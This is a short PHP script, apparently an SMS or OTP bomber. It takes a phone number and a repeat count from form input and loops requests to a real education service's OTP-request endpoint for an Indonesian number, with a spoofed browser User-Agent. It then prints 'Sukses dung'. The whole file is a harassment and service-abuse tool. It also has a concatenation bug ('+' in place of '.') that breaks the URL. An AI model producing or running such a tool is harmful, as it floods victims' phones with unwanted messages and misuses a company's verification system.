<?php

$no = $_POST["no"];
$loop = $_POST["loop"];
$x = 0;
while($x < $loop) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://students.byjus.com/mobiles/request_otp?mobile=%2B62-" + $no);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:application/json","Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Connection:keep-alive","Content-Length:55","User-Agent:Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"));
    curl_exec($ch);
    $x++;
    
}
    echo "Sukses dung";

?>